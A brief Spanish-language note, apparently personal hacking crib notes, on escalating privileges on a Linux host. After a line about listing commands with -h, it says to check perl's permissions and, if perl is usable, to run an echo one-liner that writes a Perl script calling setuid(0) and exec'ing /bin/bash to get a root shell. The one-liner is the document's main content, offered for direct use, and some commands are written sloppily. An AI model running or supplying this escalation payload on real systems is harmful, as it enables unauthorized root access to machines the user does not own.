Usa el comando -h -help para lograr ver los comando disponibles a tu usuario.

1. Escalar Privilegios;
     - Checkear  permiso de ejecucion de perl  ( ls - l /usr/bin/perl )  en caso  de que si 
	  escalar con (  echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > script.pl  )